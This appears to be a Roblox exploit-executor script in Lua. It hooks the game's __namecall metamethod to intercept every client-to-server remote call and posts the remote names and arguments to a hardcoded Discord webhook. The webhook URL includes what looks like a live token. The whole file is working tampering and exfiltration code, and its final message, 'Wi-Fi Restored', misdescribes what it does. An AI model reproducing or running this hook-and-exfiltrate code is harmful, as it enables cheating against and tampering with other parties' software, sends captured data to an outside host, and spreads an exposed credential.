local WH = "https://discord.com/api/webhooks/1489564311423815720/95RTxCNmEopgkqiRY1n_jH5hxMFuNqCS5OYxppId3UE_QxdJWgXuMPbVoubeVDhp-AT6"
local http = (request or http_request or (http and http.request))
local hook = hookmetamethod

local isLogging = false 

local function sendToDiscord(remoteName, args)
    if isLogging then return end
    isLogging = true

    -- Format the outgoing data for Discord
    local argData = ""
    for i, v in pairs(args) do
        argData = argData .. "\n[" .. tostring(i) .. "]: " .. tostring(v)
    end
    
    if argData == "" then argData = "No Arguments" end

    task.spawn(function()
        pcall(function()
            http({
                Url = WH,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = game:GetService("HttpService"):JSONEncode({
                    ["content"] = "📤 **Outgoing Remote Captured**\n**Name:** `" .. remoteName .. "`\n**Data:** ```lua" .. argData .. "
```"
                })
            })
        end)
        task.wait(0.3) -- Safety delay to prevent Discord rate limits
        isLogging = false
    end)
end

-- Hooking the 'gate'
local old
old = hook(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    local args = {...}

    -- Only log Client -> Server traffic
    if not checkcaller() and (method == "FireServer" or method == "InvokeServer") then
        sendToDiscord(self.Name, args)
    end

    return old(self, ...)
end)

print("✅ Wi-Fi Restored. Outgoing Logger Active.")
